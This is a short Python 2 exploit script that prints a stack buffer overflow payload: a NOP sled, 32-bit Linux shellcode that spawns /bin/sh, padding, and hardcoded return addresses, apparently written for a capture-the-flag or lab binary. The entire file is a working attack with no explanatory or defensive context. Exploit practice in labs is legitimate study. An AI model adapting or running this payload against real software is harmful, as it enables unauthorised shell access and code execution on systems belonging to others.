import struct

nopsled = "\x90" * 31
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
padding = "\x90" * 24
ret = struct.pack("I", 0x0804853e)
eip = struct.pack("I", 0xbffff6e0)

print nopsled + shellcode + padding + ret + eip
